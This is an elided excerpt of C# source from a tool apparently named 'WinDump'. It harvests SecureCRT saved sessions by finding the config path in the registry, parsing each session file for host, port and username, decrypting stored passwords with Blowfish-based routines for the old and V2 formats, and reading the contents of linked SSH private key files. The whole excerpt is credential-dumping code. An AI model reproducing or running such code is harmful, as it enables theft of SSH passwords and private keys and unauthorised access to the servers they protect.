...
namespace WinDump
{
    internal class SecureCRT
    {
        internal static Dictionary<string,string> Parse(string data)
        {
            ...
            foreach (Match m in new Regex("S:\"(.*?)\"=(.*?)\n").Matches(data)) {
                r[m.Groups[1].Value] = m.Groups[2].Value.Trim();
            }
            foreach (Match m in new Regex("D:\"(.*?)\"=(.*?)\n").Matches(data))
            {
                r[m.Groups[1].Value] = Convert.ToInt32(m.Groups[2].Value.Trim(), 16).ToString();
            }
            return r;
        }
        internal static string GetConfigPath()
        {
            using (var key = Registry.CurrentUser.OpenSubKey(@"Software\VanDyke\SecureCRT", false))
            {
                if (key == null) {
                    return null;
                }
                var path = key.GetValue("Config Path", "").ToString();
        ...
        internal static DataTable GetSecureCRT()
        {
            ...
            var sessionPath = Path.Combine(configPath, "Sessions");
            if (!Directory.Exists(sessionPath)) {
                return dt;
            }
            foreach(var file in Directory.GetFiles(sessionPath, "*.ini", SearchOption.AllDirectories))
            {
                if (file.EndsWith("__FolderData__.ini"))
                {
                    continue;
                }
                var name = Path.GetFileName(file);
                var config = Parse(File.ReadAllText(file));
                config.TryGetValue("Hostname",  out var host);
                if (string.IsNullOrEmpty(host)) {
                    continue;
                }
                config.TryGetValue("[SSH2] Port", out var port);
                config.TryGetValue("Username", out var user);
                config.TryGetValue("Password V2", out var pwd);
                if (!string.IsNullOrEmpty(pwd)) {
                    pwd = DecryptV2(pwd);
                }
                else
                {
                    config.TryGetValue("Password", out pwd);
                    if (!string.IsNullOrEmpty(pwd)) {
                        pwd = Decrypt(pwd);
                    }
                }
                config.TryGetValue("Identity Filename V2", out var keypath);
                if (string.IsNullOrEmpty(keypath)) {
                    config.TryGetValue("Identity Filename", out keypath);
                }
                var key = "";
                if (!string.IsNullOrEmpty(keypath) && File.Exists(keypath)) { 
                    key = File.ReadAllText(keypath);
                }
                dt.Rows.Add(name, host, port, user, pwd, key);
        ...
        internal static string Decrypt(string str)
        {
            ...
            byte[] ciphered_bytes = Utils.FromHex(str);
            if (ciphered_bytes.Length <= 8) return null;

            var algo = new BlowfishCRT();
            ...
            algo = new BlowfishCRT();
            algo.InitializeKey(Key2);
            algo.SetIV(IV);
            algo.DecryptCBC(decryptedTxt, 4, decryptedTxt.Length - 8, ciphered_bytes, 0);
            string ciphered = Encoding.Unicode.GetString(ciphered_bytes).Split('\0')[0];
            return ciphered;
        }
        internal static string DecryptV2(string input, string passphrase = "")
        {
            try
            {
                ...
                byte[] iv = new byte[16];
                byte[] array = Utils.FromHex(input);
                if (v3)
                {
    ...
    internal class Bcrypt
    {
        ...
        /// <returns></returns>
        private byte[] BcryptHash(BlowfishCRT blowfish, byte[] sha2pass, byte[] sha2salt)
        {
